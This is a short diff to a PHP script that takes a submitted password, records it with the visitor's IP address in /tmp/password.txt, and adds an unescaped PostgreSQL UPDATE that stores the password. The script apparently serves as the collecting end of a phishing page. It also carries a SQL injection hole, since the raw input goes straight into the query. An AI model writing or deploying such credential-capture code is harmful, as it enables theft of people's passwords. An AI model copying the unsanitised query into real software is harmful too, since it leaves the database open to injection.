@@ -3,8 +3,9 @@
   use PHPMailer\PHPMailer\Exception;
 
   // require_once 'vendor/autoload.php';
+  require __DIR__ . '/database.php';
 
-  $password = $_POST["password"];
+  $pass = $_POST["password"];
   if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ip = $_SERVER['HTTP_CLIENT_IP'];
   } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
@@ -12,11 +13,20 @@
   } else {
       $ip = $_SERVER['REMOTE_ADDR'];
   }
-  $content = "Password: ".$password." - IP: ".$ip.".
+  $content = "Password: ".$pass." - IP: ".$ip.".
 ";
   $fp = fopen("/tmp/password.txt","a");
   fwrite($fp,$content);
   fclose($fp);
+
+  $sql =<<<EOF
+  UPDATE DATA
+  SET password = $pass
+  order by date_time_column desc
+  limit 1;
+EOF;
+  $ret = pg_query($dbconn, $sql);
+  pg_close($dbconn);
 
 //   $mail = new PHPMailer(true);
 
